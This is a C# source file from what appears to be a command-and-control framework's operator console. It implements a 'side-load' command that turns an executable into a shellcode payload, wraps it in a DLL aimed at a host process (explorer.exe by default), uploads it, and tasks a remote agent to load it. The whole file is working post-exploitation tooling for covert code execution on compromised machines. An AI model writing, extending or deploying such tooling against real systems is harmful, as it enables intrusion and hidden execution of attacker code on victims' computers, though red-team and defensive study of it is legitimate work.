using ApiModels.Response;
using Commander.Commands;
using Commander.Commands.Agent;
using Commander.Communication;
using Commander.Executor;
using Commander.Terminal;
using System;
using System.Collections.Generic;
using System.CommandLine;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Commander.Commands.SideLoad
{

    public class SiteLoadCommandOptions
    {
        public string fileToSideLoad { get; set; }
        public string parameters { get; set; }
        public string processName { get; set; }
        public bool verbose { get; set; }
        public bool raw { get; set; }
    }

    public class SiteLoadCommand : EnhancedCommand<SiteLoadCommandOptions>
    {
        public override string Category => CommandCategory.Core;

        public override string Name => EndPointCommand.SIDELOAD;
        public override ExecutorMode AvaliableIn => ExecutorMode.AgentInteraction;

        public override string Description => "SideLoad an executable";

        public virtual string ComputeParams(string innerParams)
        {
            return innerParams;
        }

        public override RootCommand Command => new RootCommand(this.Description)
        {
            new Argument<string>("fileToSideLoad", "path of the file to load"),
            new Argument<string>("parameters", () => string.Empty, "parameters to use"),
            new Option<string>(new[] { "--processName", "-p" }, () => "explorer.exe" ,"process name to start."),
            new Option(new[] { "--verbose", "-v" }, "Show details of the command execution."),
            new Option(new[] { "--raw", "-r" }, "inject the raw file"),
        };

        protected override async Task<bool> HandleCommand(CommandContext<SiteLoadCommandOptions> context)
        {
            if (!File.Exists(context.Options.fileToSideLoad))
            {
                context.Terminal.WriteError($"File {context.Options.fileToSideLoad} not found");
                return false;
            }

            string dllFileName = string.Empty;
            if (!context.Options.raw)
            {
                context.Terminal.WriteLine($"Generating bin payload with params {context.CommandParameters}...");

                var result = InjectCommand.GenerateBin(context.Options.fileToSideLoad, this.ComputeParams(context.Options.parameters), out var binFileName);
                if (context.Options.verbose)
                    context.Terminal.WriteLine(result);

                if (string.IsNullOrEmpty(context.Options.processName))
                {
                    context.Terminal.WriteLine("processName is null");
                    context.Options.processName = "explorer.exe";
                }
                context.Terminal.WriteLine($"Generating dll from bin...");
                result = GenerateDllFromBin(binFileName, context.Options.processName, out dllFileName);
                if (context.Options.verbose)
                    context.Terminal.WriteLine(result);

                File.Delete(binFileName);

            }
            else
            {
                dllFileName = context.Options.fileToSideLoad;
            }

            context.Terminal.WriteLine($"Pushing {dllFileName} to the server...");

            byte[] fileBytes = null;
            using (FileStream fs = File.OpenRead(dllFileName))
            {
                fileBytes = new byte[fs.Length];
                fs.Read(fileBytes, 0, (int)fs.Length);
            }

            bool first = true;
            var fileId = await context.CommModule.Upload(fileBytes, dllFileName, a =>
            {
                context.Terminal.ShowProgress("uploading", a, first);
                first = false;
            });


            if (!context.Options.raw)
            {
                File.Delete(dllFileName);
                //context.Terminal.WriteLine(fileName);
            }

            string fileName = Path.GetFileName(dllFileName);

            await context.CommModule.TaskAgent(context.CommandLabel, Guid.NewGuid().ToString(), context.Executor.CurrentAgent.Metadata.Id, "side-load", fileId, fileName);
            context.Terminal.WriteSuccess($"Command {this.Name} tasked to agent {context.Executor.CurrentAgent.Metadata.Id}.");
            return true;
        }

        public static string GenerateDllFromBin(string binpath, string processName, out string dllPath)
        {
            var filenamewo = Path.GetFileNameWithoutExtension(binpath);
            var name = Path.Combine(InjectCommand.TmpFolder, filenamewo + ".dll");
            string ret = Internal.BinMaker.GenerateDll(binpath, processName, name);
            dllPath = name;
            return ret;
        }
    }
}
